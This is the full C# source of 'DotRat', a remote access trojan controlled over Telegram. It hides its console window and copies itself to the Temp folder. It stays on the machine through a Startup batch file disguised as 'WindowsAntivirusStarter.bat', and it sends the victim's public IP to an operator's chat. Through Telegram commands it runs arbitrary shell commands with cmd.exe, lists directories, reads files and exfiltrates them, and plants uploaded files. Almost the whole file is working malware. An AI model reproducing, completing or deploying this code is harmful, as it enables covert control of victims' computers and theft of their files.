using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Helpers;
using Telegram.Bot.Types;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Text;
using System.Xml.Linq;

namespace DotRat
{


    class Program
    {
        // Hide Window
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;


        private static TelegramBotClient botClient;
        private static string defaultUploadPath;

        private static bool isAlreadyRunning = false;
        static bool IsAlreadyRunning()
        {
            string currentProcessName = Process.GetCurrentProcess().ProcessName;
            Process[] processes = Process.GetProcessesByName(currentProcessName);
            isAlreadyRunning = processes.Length > 1;
            return isAlreadyRunning;
        }

        static async Task Main()
        {

            // Verificar si el programa ya está en ejecución
            if (IsAlreadyRunning())
            {
                //Console.WriteLine("Proceso en segundo plano ejecutandose.");
                //Console.ReadKey();
                return; // No hacer nada si ya está en ejecución
            }

            // Ocultar la ventana de la consola
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, SW_HIDE);

            // Obtener información de la instancia
            string pcName = Environment.MachineName;
            string ipAddress = await GetPublicIPAddress();
            string operatingSystem = Environment.OSVersion.ToString();

            // Crear una instancia de InstanceInfo y agregarla a la lista

            botClient = new TelegramBotClient("BOTTOKEN");
            string channelChatId = "CHATID";

            defaultUploadPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp");


            // Crear el archivo batch en la carpeta de inicio del usuario
            string startupFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup");
            string batchFilePath = Path.Combine(startupFolderPath, "WindowsAntivirusStarter.bat"); // BA

            CopyExecutableToDestination();


            // Verificar si el archivo batch ya existe, si no, crearlo
            if (!System.IO.File.Exists(batchFilePath))
            {
                string executablePath = Process.GetCurrentProcess().MainModule.FileName;
                string copyPath = Path.Combine(defaultUploadPath, Path.GetFileName(executablePath));

                // Copiar el archivo ejecutable a la ruta de la copia
                System.IO.File.Copy(executablePath, copyPath, true);

                // Crear el contenido del archivo .bat
                string batContent = $"@echo off\r\n" +
                                    $"start \"\" \"{copyPath}\"\r\n" +
                                    $"exit";

                string batFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "WindowsAntivirusStarter.bat"); // -.-

                // Guardar el contenido en el archivo .bat
                System.IO.File.WriteAllText(batFilePath, batContent);

            }

            // Eliminar el hook
            // Esto debe hacerse antes de salir del programa para evitar problemas

            // Enviar mensaje al canal
            await botClient.SendTextMessageAsync(chatId: "AGAINCHATID REMOVE DOBLE QUOTES", text: "👾 New Session from: " + ipAddress);
            //await botClient.SendTextMessageAsync(chatId: -1001857319085, text: "👾 Sesion Iniciada desde " + ipAddress);

            botClient.OnMessage += Bot_OnMessage;
            botClient.StartReceiving();

            Console.WriteLine("Bot started. Press any key to exit.");
            Console.ReadKey();

            botClient.StopReceiving();
        }
        private static string GetLocalIPAddress()
        {
            // Obtener la dirección IP del PC local
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "Dirección IP no encontrada.";
        }

        private static async Task<string> GetPublicIPAddress()
        {
            using (var httpClient = new HttpClient())
            {
                try
                {
                    string response = await httpClient.GetStringAsync("https://api.ipify.org?format=json");
                    dynamic data = Newtonsoft.Json.JsonConvert.DeserializeObject(response);
                    return data.ip;
                }
                catch
                {
                    return "Dirección IP externa no encontrada.";
                }
            }
        }

        static void CopyExecutableToDestination()
        {
            string currentExecutablePath = Process.GetCurrentProcess().MainModule.FileName;
            string destinationPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", Path.GetFileName(currentExecutablePath));

            if (!System.IO.File.Exists(destinationPath))
            {
                System.IO.File.Copy(currentExecutablePath, destinationPath);
            }
        }


        private static async void Bot_OnMessage(object sender, MessageEventArgs e)
        {
            try
            {
                if (e.Message.Type == MessageType.Document)
                {
                    // El mensaje es un documento enviado por el usuario
                    long chatId = e.Message.Chat.Id;

                    // Descargar el archivo desde Telegram
                    var file = await botClient.GetFileAsync(e.Message.Document.FileId);
                    string fileName = Path.Combine(defaultUploadPath, e.Message.Document.FileName);

                    using (var stream = new FileStream(fileName, FileMode.Create))
                    {
                        await botClient.DownloadFileAsync(file.FilePath, stream);
                    }

                    // El archivo ha sido guardado en el PC
                    string message = "The file has been saved on the PC in the path: " + fileName;
                    await botClient.SendTextMessageAsync(chatId: chatId, text: message);
                }

                else if (e.Message.Text != null)
                {
                    long chatId = e.Message.Chat.Id;
                    string message = string.Empty;
                    string command = e.Message.Text;

                    // Obtener el nombre del PC
                    string pcName = Environment.MachineName;

                    // Obtener la dirección IP pública
                    string ipAddress = await GetPublicIPAddress();

                    // Obtener el sistema operativo
                    string operatingSystem = Environment.OSVersion.ToString();


                    if (e.Message.Text.StartsWith("/download"))
                    {
                        message = await ProcessDownloadCommand(e.Message.Text, chatId);
                    }
                    else if (e.Message.Text.StartsWith("/type"))
                    {
                        // Obtener la ruta del archivo del comando
                        string filePath = e.Message.Text.Replace("/type", "").Trim();

                        // Procesar el comando /type con la ruta del archivo y el chatId
                        message = await ProcessTypeCommand(filePath, chatId);
                    }
                    else if (e.Message.Text.StartsWith("/dir"))
                    {
                        message = await ProcessDirCommand(e.Message.Text);
                    }
                    else if (e.Message.Text.StartsWith("/upload_path"))
                    {
                        message = await ProcessUploadPathCommand(e.Message.Text);
                    }
                    else if (e.Message.Text.StartsWith("/delete_persistence"))
                    {
                        DeletePersistence();
                        message = "Persistencia eliminada.";
                    }
                    else if (e.Message.Text.StartsWith("/help"))
                    {
                        message = GetHelpMessage();
                    }
                    else if (e.Message.Text.StartsWith("/persistence_status"))
                    {
                        message = CheckPersistenceStatus();

                    }

                    else if (e.Message.Text.StartsWith("/cmd"))
                    {
                        // Obtener el comando a ejecutar del mensaje
                        string commandToExecute = e.Message.Text.Replace("/cmd", "").Trim();

                        // Validar el comando
                        if (!string.IsNullOrWhiteSpace(commandToExecute))
                        {
                            // Ejecutar el comando en el sistema
                            message = ExecuteCommand(commandToExecute);

                            // Verificar la longitud del mensaje
                            if (message.Length > 4096)
                            {
                                // Dividir el mensaje en partes más pequeñas
                                var parts = SplitMessage(message, 4096);

                                // Enviar cada parte como un mensaje separado
                                foreach (var part in parts)
                                {
                                    await botClient.SendTextMessageAsync(
                                        chatId: chatId,
                                        text: part
                                    );
                                }

                                // Salir del método para evitar enviar el mensaje original
                                return;
                            }
                        }
                        else
                        {
                            message = "Invalid command.";
                        }
                    }
                    else
                    {
                        // Comando no reconocido, enviar un mensaje de ayuda
                        string helpMessage = "Command not recognised. Available commands:\n" + GetHelpMessage();
                    }


                    await botClient.SendTextMessageAsync(
                        chatId: chatId,
                        text: message
                    );
                }

            }
            catch (Exception ex)
            {
                // Manejar cualquier error que pueda ocurrir al guardar el archivo
                string cmderror = "If you are using /cmd and putting a path with spaces please use double quotes in the specified path.";
                string errorMessage = "Error: " + ex.Message;
                await botClient.SendTextMessageAsync(chatId: e.Message.Chat.Id, text: cmderror + "\n\n" + errorMessage);
            }
        }

        private static async Task<string> ProcessDownloadCommand(string command, long chatId)
        {
            // Obtener la ruta del archivo del comando
            string filePath = command.Replace("/download", "").Trim();

            // Verificar que la ruta del archivo es válida
            if (System.IO.File.Exists(filePath))
            {
                // Enviar el archivo al chat de Telegram
                using (var fileStream = new System.IO.FileStream(filePath, System.IO.FileMode.Open, System.IO.FileAccess.Read))
                {
                    await botClient.SendDocumentAsync(
                        chatId: chatId,
                        document: new Telegram.Bot.Types.InputFiles.InputOnlineFile(fileStream, System.IO.Path.GetFileName(filePath))
                    );
                }
                return "File sent.";
            }
            else
            {
                return "The specified file does not exist.";
            }
        }

        private static void DeletePersistence()
        {
            string batFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "WindowsAntivirusStarter.bat");
            string copyPath = Path.Combine(defaultUploadPath, Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName));

            // Eliminar el archivo .bat
            if (System.IO.File.Exists(batFilePath))
            {
                System.IO.File.Delete(batFilePath);
                Console.WriteLine("Persistence deleted: .bat file");
            }
            else
            {
                Console.WriteLine("Persistence .bat file not found.");
            }

            // Eliminar el archivo .exe en la carpeta Temp
            if (System.IO.File.Exists(copyPath))
            {
                System.IO.File.Delete(copyPath);
                Console.WriteLine("Persistence deleted: .exe file in Temp.");
            }
            else
            {
                Console.WriteLine("The .exe file was not found in Temp.");
            }
        }
        private static async Task<string> ProcessTypeCommand(string filePath, long chatId)
        {
            // Utilizar expresión regular para validar la ruta del archivo
            var regex = new Regex(@"^[A-Za-z]:\\(?:[^\\/:*?""<>|\r\n]+\\)*[^\\/:*?""<>|\r\n]+\.\w+$");

            var match = regex.Match(filePath);
            if (match.Success)
            {
                // Ruta válida con espacios, leer el contenido del archivo
                try
                {
                    // Leer el contenido del archivo
                    string fileContent = System.IO.File.ReadAllText(filePath);

                    // Dividir el contenido del archivo en partes de 4096 caracteres (límite de longitud de mensaje en Telegram)
                    int maxMessageLength = 4096;
                    int numMessages = (int)Math.Ceiling((double)fileContent.Length / maxMessageLength);
                    List<string> messages = new List<string>();

                    for (int i = 0; i < numMessages; i++)
                    {
                        int startIndex = i * maxMessageLength;
                        int length = Math.Min(maxMessageLength, fileContent.Length - startIndex);
                        string messagePart = fileContent.Substring(startIndex, length);
                        messages.Add(messagePart);
                    }

                    // Enviar cada parte del contenido del archivo como un mensaje separado
                    foreach (var messagePart in messages)
                    {
                        await botClient.SendTextMessageAsync(chatId: chatId, text: messagePart);
                    }

                    return "Content of the file sent successfully.";
                }
                catch (Exception ex)
                {
                    return "Error reading the file: " + ex.Message;
                }
            }
            else
            {
                // Ruta inválida o sin espacios, mostrar un mensaje de error
                return "Invalid file path. Make sure to use a valid path with spaces.";
            }
        }

        private static string CheckPersistenceStatus()
        {
            try
            {
                string startupFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup");
                string batchFilePath = Path.Combine(startupFolderPath, "WindowsAntivirusStarter.bat");
                if (System.IO.File.Exists(batchFilePath))
                {
                    return "Persistence is configured and active.";
                }
                else
                {
                    return "Persistence is not configured.";
                }
            }
            catch (Exception ex)
            {
                return "Error verifying persistence: " + ex.Message;
            }
        }

        private static async Task<string> ProcessDirCommand(string command)
        {
            // Obtener la ruta del directorio del comando
            string dirPath = command.Replace("/dir", "").Trim();

            // Verificar que la ruta del directorio es válida
            if (System.IO.Directory.Exists(dirPath))
            {
                // Obtener los nombres de las carpetas y archivos dentro del directorio
                var directories = System.IO.Directory.GetDirectories(dirPath);
                var files = System.IO.Directory.GetFiles(dirPath);

                // Crear un mensaje con los nombres de las carpetas y archivos
                string message = "Content of the path " + dirPath + ":\n";

                // Agregar carpetas
                message += "\nFolders:\n";
                foreach (var dir in directories)
                {
                    message += System.IO.Path.GetFileName(dir) + "\n";
                }

                // Agregar archivos
                message += "\nFiles:\n";
                foreach (var file in files)
                {
                    message += System.IO.Path.GetFileName(file) + "\n";
                }

                return message;
            }
            else
            {
                return "Error of path.";
            }
        }

        private static async Task<string> ProcessUploadPathCommand(string command)
        {
            // Obtener la ruta de upload_path del mensaje
            string uploadPath = command.Replace("/upload_path", "").Trim();

            // Verificar si se especificó una ruta personalizada
            if (string.IsNullOrWhiteSpace(uploadPath))
            {
                uploadPath = defaultUploadPath;
            }
            else
            {
                // Decodificar la ruta para manejar espacios u otros caracteres especiales
                uploadPath = Uri.UnescapeDataString(uploadPath);

                // Verificar que la ruta es válida
                if (!Directory.Exists(uploadPath))
                {
                    uploadPath = defaultUploadPath;
                }
            }

            // Asignar la ruta de upload_path
            defaultUploadPath = uploadPath;

            return "Upload_path correctly configured: " + defaultUploadPath;
        }

        private static string GetHelpMessage()
        {
            string message = "Available commands:\n";
            message += "/download file_path: Download a file from the PC.\n";
            message += "/dir directory_path: Displays the directories within a path..\n";
            message += "/help: Show this help.\n";
            message += "/type file_path: Reads the contents of a file.\n";
            message += "/upload_path [custom_path]: Configures the path where files uploaded from Telegram will be saved. If no path is specified, the default path will be used. aka C:\\Users\\{usuario}\\AppData\\Local\\Temp\n";
            message += "/persistence_status: You will be able to verify that persistence is added without any problem.\n";

            return message;
        }
        private static string ExecuteCommand(string command)
        {
            try
            {
                // Iniciar un proceso para ejecutar el comando
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                process.StartInfo = startInfo;
                process.Start();

                // Leer la salida del comando
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                return output;
            }
            catch (Exception ex)
            {
                return "Error executing the command: " + ex.Message;
            }
        }

        private static List<string> SplitMessage(string message, int maxMessageLength)
        {
            // Dividir el mensaje en partes más pequeñas respetando límites de palabra
            List<string> parts = new List<string>();
            var words = message.Split(' ');

            string currentPart = string.Empty;
            foreach (var word in words)
            {
                if ((currentPart + word).Length > maxMessageLength)
                {
                    parts.Add(currentPart);
                    currentPart = word + " ";
                }
                else
                {
                    currentPart += word + " ";
                }
            }

            if (!string.IsNullOrWhiteSpace(currentPart))
            {
                parts.Add(currentPart);
            }

            return parts;
        }

    }
}
